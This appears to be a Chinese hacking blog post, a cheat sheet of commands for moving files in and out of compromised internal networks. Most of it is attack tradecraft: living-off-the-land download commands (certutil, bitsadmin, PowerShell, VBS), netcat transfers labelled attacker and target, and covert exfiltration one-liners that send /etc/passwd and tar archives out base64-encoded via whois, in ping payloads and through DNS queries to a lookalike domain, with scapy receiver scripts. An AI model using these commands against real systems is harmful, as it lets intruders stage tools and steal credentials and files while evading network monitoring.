<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  

  
  <title>内网文件传输与下载 | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  
  
  <meta name="description" content="wput wput dir_name ftp://linuxpig:123456@host.com/  wget wget http://site.com/1.rar -O 1.rar  ariac2（需安装） aria2c -o owncloud.zip https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2  powersh">
<meta property="og:type" content="article">
<meta property="og:title" content="内网文件传输与下载">
<meta property="og:url" content="http://yoursite.com/2020/03/05/内网文件传输与下载/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="wput wput dir_name ftp://linuxpig:123456@host.com/  wget wget http://site.com/1.rar -O 1.rar  ariac2（需安装） aria2c -o owncloud.zip https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2  powersh">
<meta property="og:locale" content="en">
<meta property="og:updated_time" content="2020-03-05T04:31:55.844Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="内网文件传输与下载">
<meta name="twitter:description" content="wput wput dir_name ftp://linuxpig:123456@host.com/  wget wget http://site.com/1.rar -O 1.rar  ariac2（需安装） aria2c -o owncloud.zip https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2  powersh">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/images/default-avatar.jpg">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/css/highlight.css">
</head>
</html>
<body>
  <div id="fullpage" class="mobile-nav-right">
    
      <div id="wrapper" title="图片来自网络">
    
    
      <header id="header">
  <div id="nav-toggle" class="nav-toggle"></div>
  <div class="head-box global-width">
    <nav class="nav-box nav-right">
      
        <a class="nav-item" href="/" title
        
        >首页</a>
      
        <a class="nav-item" href="/archives" title
        
        >归档</a>
      
    </nav>
  </div>
</header>
      <div id="middlecontent" title class="global-width sidebar-right">
        <section id="main"><article id="post-内网文件传输与下载" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 class="article-title" itemprop="name">
      内网文件传输与下载
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2020/03/05/内网文件传输与下载/" class="article-date">
  <time datetime="2020-03-05T03:55:14.000Z" itemprop="datePublished">2020-03-05</time>
</a>
    
    
  </div>
  
    <span id="busuanzi_container_page_pv">
      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
    </span>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <p><strong>wput</strong></p>
<pre>wput dir_name ftp://linuxpig:123456@host.com/</pre>

<p><strong>wget</strong></p>
<pre>wget http://site.com/1.rar -O 1.rar</pre>

<p><strong>ariac2（需安装）</strong></p>
<pre>aria2c -o owncloud.zip https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2</pre>

<p><strong>powershell</strong></p>
<pre>
$p = New-Object System.Net.WebClient 
$p.DownloadFile("http://domain/file","C:%homepath%file") 
</pre>

<p><strong>vbs脚本</strong></p>
<pre>
Set args = Wscript.Arguments
Url = "http://domain/file"
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", Url, False
xHttp.Send
with bStrm
.type = 1 '
.open
.write xHttp.responseBody
.savetofile " C:\%homepath%\file", 2 '
end with
</pre>
<p>执行 ：cscript test.vbs</p>
<p><strong>Perl</strong></p>
<pre>
#!/usr/bin/perl 
use LWP::Simple; 
getstore("http://domain/file", "file");
</pre>
<p>执行：perl test.pl</p>
<p><strong>Python</strong></p>
<pre>
#!/usr/bin/python 
import urllib2 
u = urllib2.urlopen('http://domain/file') 
localFile = open('local_file', 'w') 
localFile.write(u.read()) 
localFile.close()
</pre>
<p>执行：python test.py</p>
<p><strong>Ruby</strong></p>
<pre>
#!/usr/bin/ruby
require 'net/http'
Net::HTTP.start("www.domain.com") { |http|
r = http.get("/file")
open("save_location", "wb") { |file|
file.write(r.body)
}
}
</pre>
<p>执行：ruby test.rb</p>
<p><strong>PHP</strong></p>
<pre>
<?php
$url  = 'http://www.example.com/file';
$path = '/path/to/file';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$data = curl_exec($ch);
curl_close($ch);
file_put_contents($path, $data);
?>
</pre>
<p>执行：php test.php</p>
<p><strong>NC attacker</strong></p>
<pre>
cat file | nc -l 1234
target
nc host_ip 1234 > file</pre>

<p><strong>FTP</strong></p>
<pre>ftp 127.0.0.1 username password get file exit</pre>

<p><strong>TFTP</strong></p>
<pre>tftp -i host GET C:%homepath%file location_of_file_on_tftp_server</pre>

<p><strong>Bitsadmin</strong></p>
<pre>bitsadmin /transfer n http://domain/file c:%homepath%file</pre>

<p><strong>Window 文件共享</strong></p>
<pre>net use x: \127.0.0.1\share /user:example.comuserID myPassword</pre>

<p><strong>SCP 本地到远程</strong></p>
<pre>scp file user@host.com:/tmp</pre>

<p><strong>远程到本地</strong></p>
<pre>scp user@host.com:/tmp file</pre>

<p><strong>rsync 远程rsync服务器中拷贝文件到本地机</strong></p>
<pre>rsync -av root@192.168.78.192::www /databack</pre>

<p><strong>本地机器拷贝文件到远程rsync服务器</strong></p>
<pre>rsync -av /databack root@192.168.78.192::www</pre>

<p><strong>certutil.exe</strong></p>
<pre>certutil.exe -urlcache -split -f http://site.com/file</pre>

<p><strong>copy</strong></p>
<pre>copy \\IP\ShareName\file.exe file.exe</pre>

<p><strong>WHOIS 接收端 Host B：</strong></p>
<pre>nc -vlnp 1337 | sed "s/ //g" | base64 -d </pre>

<p><strong>发送端 Host A：</strong></p>
<pre>whois -h host_ip -p 1337 `cat /etc/passwd | base64`</pre>

<p><strong>WHOIS + TAR First:</strong></p>
<pre>ncat -k -l -p 4444 | tee files.b64  #tee to a file so you can make sure you have it</pre>

<p><strong>Next</strong></p>
<pre>tar czf - /tmp/* | base64 | xargs -I bits timeout 0.03 whois -h host_ip -p 4444 bits</pre>

<p><strong>Finally</strong></p>
<pre>cat files.b64 | tr -d '\r\n' | base64 -d | tar zxv #to get the files out</pre>

<p><strong>PING 发送端:</strong></p>
<pre>xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done</pre>

<p><strong>接收端ping_receiver.py:</strong></p>
<pre>
import sys

try:
    from scapy.all import *
except:
    print("Scapy not found, please install scapy: pip install scapy")
    sys.exit(0)


def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 8:
            data = pkt[ICMP].load[-4:]
            print(f'{data.decode("utf-8")}', flush=True, end="", sep="")

sniff(iface="eth0", prn=process_packet)
</pre>
<p>python3 ping_receiver.py</p>
<p><strong>DIG 发送端:</strong></p>
<pre>xxd -p -c 31 /etc/passwd | while read line; do dig @172.16.1.100 +short +tries=1 +time=1 $line.gooogle.com; done</pre>

<p><strong>接收端dns_reciver.py:</strong></p>
<pre>
try:
    from scapy.all import *
except:
    print("Scapy not found, please install scapy: pip install scapy")

def process_packet(pkt):
    if pkt.haslayer(DNS):
        domain = pkt[DNS][DNSQR].qname.decode('utf-8')
        root_domain = domain.split('.')[1]
        if root_domain.startswith('gooogle'):
            print(f'{bytearray.fromhex(domain[:-13]).decode("utf-8")}', flush=True, end='')

sniff(iface="eth0", prn=process_packet)
</pre>
<p>python3 dns_reciver.py</p>

      
    </div>
    
      <footer class="article-footer">
        完
      </footer>
    
  </div>
  
    
<nav id="article-nav">
  <div class="article-nav-block">
    
  </div>
  <div class="article-nav-block">
    
      <a href="/2019/12/09/Apache Flink任意jar包上传导致远程代码执行/" id="article-nav-older" class="article-nav-link-wrap">
        <div class="article-nav-title">Apache Flink任意jar包上传导致远程代码执行</div>
        <strong class="article-nav-caption"></strong>
      </a>
    
  </div>
</nav>

    <link rel="stylesheet" href="/css/gitment.css"> 
<script src="/js/gitment.js"></script>

<div id="gitmentContainer"></div>

<script>
var gitment = new Gitment({
  owner: '',
  repo: '',
  oauth: {
    client_id: '',
    client_secret: '',
  },
})
gitment.render('gitmentContainer')
</script>

  
  
</article>
</section>
        <aside id="sidebar">
  
    <div class="widget-box">
  <div class="avatar-box">
    <img class="avatar" src="/images/default-avatar.jpg" title="图片来自网络"></img>
    <h3 class="avatar-name">
      
        柚子味的风
      
    </h3>
    <p class="avatar-slogan">
      know it then hack it
    </p>
  </div>
</div>


  
    

  
    

  
    
  
    
  <div class="widget-box">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li></ul>
    </div>
  </div>

  
    
  <div class="widget-box">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/03/05/内网文件传输与下载/">内网文件传输与下载</a>
          </li>
        
          <li>
            <a href="/2019/12/09/Apache Flink任意jar包上传导致远程代码执行/">Apache Flink任意jar包上传导致远程代码执行</a>
          </li>
        
          <li>
            <a href="/2019/11/12/通过jboss反弹shell/">通过jboss反弹shell</a>
          </li>
        
          <li>
            <a href="/2019/10/11/使用cmd开启3389端口的方法/">使用cmd开启3389端口的方法</a>
          </li>
        
          <li>
            <a href="/2019/09/27/cs的使用教程/">powershell反弹shell</a>
          </li>
        
      </ul>
    </div>
  </div>

  
      <div class="widget-box">
    <h3 class="widget-title">友链</h3>
    <div class="widget">
      
        <a style="display: block;" href="http://richardtang.funnysec.com" title target='_blank'
        >RichardTang</a>
      
    </div>
  </div>

  
</aside>
      </div>
      <footer id="footer">
  <div class="foot-box global-width">
    &copy; 2020 John Doe &nbsp;&nbsp;
    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    &nbsp;|&nbsp;主题 <a href="https://github.com/yiluyanxia/hexo-theme-antiquity">antiquity</a>
    <br>
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span id="busuanzi_container_site_pv">不蒜子告之   阁下是第<span id="busuanzi_value_site_pv"></span>个访客</span>
  </div>
</footer>
      <script src="https://code.jquery.com/jquery-2.0.3.min.js"></script>
<script>
if (!window.jQuery) {
var script = document.createElement('script');
script.src = "/js/jquery-2.0.3.min.js";
document.body.write(script);
}
</script>

  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



    </div>
    <nav id="mobile-nav" class="mobile-nav-box">
  <div class="mobile-nav-img mobile-nav-top"></div>
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
  <div class="mobile-nav-img  mobile-nav-bottom"></div>
</nav>    
  </div>
</body>
</html>